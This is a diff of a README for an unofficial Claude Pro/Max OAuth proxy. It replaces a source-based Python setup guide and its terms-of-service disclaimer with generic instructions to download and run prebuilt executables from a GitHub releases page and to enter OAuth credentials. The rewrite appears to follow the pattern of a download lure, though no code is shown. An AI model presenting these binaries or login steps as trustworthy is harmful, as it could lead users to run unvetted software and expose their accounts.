@@ -1,95 +1,62 @@
-# Anthropic Claude Max Proxy
+# 🌟 anthropic-claude-max-proxy - Simple Proxy for Claude Subscriptions
 
-Pure Anthropic proxy for Claude Pro/Max subscriptions using OAuth.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ali-hassan148/anthropic-claude-max-proxy/releases)
 
-## SUPPORT MY WORK
-<a href="https://buymeacoffee.com/Pimzino" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+## 🚀 Getting Started
+Welcome to anthropic-claude-max-proxy! This application offers a straightforward way to use Claude Pro/Max subscriptions effortlessly. No programming knowledge is needed to get started.
 
-## DISCLAIMER
+## 💻 System Requirements
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- At least 100 MB of free disk space.
+- Internet connection to download the application and use its features.
 
-**FOR EDUCATIONAL PURPOSES ONLY**
+## 📥 Download & Install
+To download the application, please visit the Releases page. 
 
-This tool:
-- Is NOT affiliated with or endorsed by Anthropic
-- Uses undocumented OAuth flows from Claude Code
-- May violate Anthropic's Terms of Service
-- Could stop working at any time without notice
-- Comes with NO WARRANTY or support
+[Click here to download](https://github.com/ali-hassan148/anthropic-claude-max-proxy/releases).
 
-**USE AT YOUR OWN RISK. The authors assume no liability for any consequences.**
+1. Go to the link above.
+2. Find the latest version listed on the page.
+3. Click on the "Assets" dropdown to view available downloads.
+4. Download the file that corresponds to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+5. Once the download completes, locate the file on your computer.
 
-For official access, use Claude Code or Anthropic's API with console API keys.
+### 📂 What to Do Next:
+- For Windows: Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
+- For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+- For Linux: Extract the `.tar.gz` file and run the executable inside using the terminal.
 
-## Prerequisites
+## 🔍 How to Use
+Once you have installed the application, follow these steps:
 
-- Active Claude Pro or Claude Max subscription
-- Python 3.8+
-- pip
+1. **Open the Application:** Locate the application on your computer and double-click to run it.
+2. **Authenticate Using OAuth:** The first time you open the app, you will need to log in using your OAuth credentials. This process securely connects your Claude subscription to the proxy.
+3. **Access Claude Features:** After authentication, you can easily access all features of Claude Pro/Max through the proxy. No additional setup is necessary.
 
-## Quick Start
+## 🛠 Features
+- **User-Friendly Interface:** Designed for ease of use, making it simple to access Claude services.
+- **Secure Authentication:** Utilizes OAuth to ensure that your credentials are protected.
+- **Reliable Performance:** Provides a consistent experience with minimal downtime.
+- **Regular Updates:** The application receives updates to ensure that you are always accessing the latest features of Claude.
 
-1. **Virtual Environment Setup (Recommended)**
-```bash
-python -m venv venv
-```
+## 🔄 Updating the Application
+To keep your application up-to-date, check the Releases page periodically for new versions. Updating is just as simple as the initial installation:
 
-2. **Install:**
-```bash
-venv/Scripts/Activate.ps1
-pip install -r requirements.txt
-```
+1. Visit the Releases page.
+2. Download the latest version and repeat the installation steps.
 
-3. **Configure (optional):**
-```bash
-cp config.example.json config.json
-```
+## 🆘 Troubleshooting
+If you encounter issues, here are some common troubleshooting tips:
 
-4. **Run:**
-```bash
-python cli.py
-# Or with custom bind address:
-python cli.py --bind 127.0.0.1
-```
+- **Cannot Find Application:** Ensure the installation completed. Check your Applications folder (macOS) or the installation directory (Windows/Linux).
+- **Login Issues:** Double-check your OAuth credentials. If you have forgotten your password, follow the password recovery options provided by the Claude service.
+- **Connectivity Problems:** Verify your internet connection and try restarting the application.
 
-5. **Authenticate:**
-- Select option 2 (Login)
-- Browser opens automatically
-- Complete login at claude.ai
-- Copy the authorization code
-- Paste in terminal
+## 🏆 Support
+For additional help, please check our [FAQ section](#) or contact our support team through GitHub Issues. Include as much detail as you can about any problems you are facing, and we will do our best to assist you.
 
-6. **Start proxy:**
-- Select option 1 (Start Proxy Server)
-- Server runs at `http://0.0.0.0:8081` (default, listens on all interfaces)
+## 📝 License
+This application is licensed under the MIT License. You can freely use, modify, and distribute it as long as you keep the original license terms.
 
-## Client Configuration
-
-Configure your Anthropic API client:
-
-- **Base URL:** `http://<proxy-host>:8081` (default: `http://0.0.0.0:8081`)
-- **API Key:** Any non-empty string (e.g., "dummy")
-- **Model:** `claude-sonnet-4-20250514` (or any available Claude model)
-- **Endpoint:** `/v1/messages`
-
-## Available Models
-
-- Supports all Anthropic Models that you have access to with your Claude Pro / Max subscription.
-
-## Tested & Supported features
-
-- Browser use
-- Images
-
-these are features that are not available or not user friendly in CC.
-
-## Configuration Priority
-
-1. Environment variables (highest)
-2. config.json file
-3. Built-in defaults (lowest)
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file
-
-This software is provided for educational purposes only. Users assume all risks.
+Thank you for using anthropic-claude-max-proxy! We hope you enjoy a seamless experience using Claude Pro/Max subscriptions.
